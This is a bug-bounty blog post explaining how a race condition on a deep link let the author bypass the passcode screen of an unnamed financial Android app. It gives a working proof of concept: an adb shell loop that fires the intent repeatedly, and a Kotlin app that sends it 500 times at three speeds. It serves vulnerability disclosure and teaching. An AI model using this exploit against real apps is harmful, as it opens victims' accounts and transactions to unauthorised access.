---
layout: post
title: "Passcode Activity Bypass using Race Condition"
date: 2019-10-18
tag: [Bug bounty, Mobile]

---

# Background
An **Activity** is one of the Android's component in an app. It is the screen that the user sees on a mobile app. (For example, the setting's "screen", home "screen, etc). A simple app could have one while more complicated ones could have dozens.

From a security perspective, I normally check if the app components are **exported**, meaning if they can be directly called by other applications. Sometimes these exported apps can be used to bypass restrictions that wasn't intended by the developer.

![Threat model of component hijacking in Android](/assets/img/blog/exportedcomponent.jpg)

## How I was able to exploit this
On this specific bug bounty program, I noticed the application permitted a deep link, for argument sake let's call it `com.android.appname://` which automatically triggered the home activity of the app. However, with a passcode setup it was not possible to access the home page. I would consider accessing this page a sensitive as if an attacker could access the home page of the app, he could access sensitive information including making financial transactions.

I initially tried to fuzz different parameters such as "com.android.appname://login=1" using automation tools but this not get me anywhere. I then had a wild thought of sending this intent multiple times quickly, and this was when I noticed the app showed the home screen briefly before entering the passcode screen.


## Proof of Concept
I then used the simple following code as a PoC, and was able to bypass the passcode screen.

```
while (true); do adb shell am start -a android.intent.action.VIEW -d "com.android.appname://"; sleep 0.15; done
```

No doubt occasionally there were few tapping attemps needed before the app registered the action (due to the timing effect), but it did the job!

I then proceeded to create a simple Android app with my limited Kotlin skills (I admit I struggled but learned a lot)

{% highlight java %}
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        bigButton.setOnClickListener {
            Log.d("fast", "fast button pressed")
            val url = "com.android.appname://"
            for (n in 1..500) {
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW, Uri.parse(url)
                    )
                )
                Thread.sleep(100)
            }
        }


        button2.setOnClickListener {
            Log.d("medium", "Medium button pressed")
            val url = "com.android.appname://"
            for (n in 1..500) {
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW, Uri.parse(url)
                    )
                )
                Thread.sleep(150)
            }
        }


        button3.setOnClickListener {
            Log.d("slow", "Slow button pressed")
            val url = "com.android.appname://"
            for (n in 1..500) {
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW, Uri.parse(url)
                    )
                )
                Thread.sleep(250)
            }
        }
    }
}
{% endhighlight %}


I created 3 buttons on the app in case the Hackerone reviewer's phone behaved differently to mine.

## Final thoughts
This was an interesting find as I never thought of bypassing passcode activities using timing attack.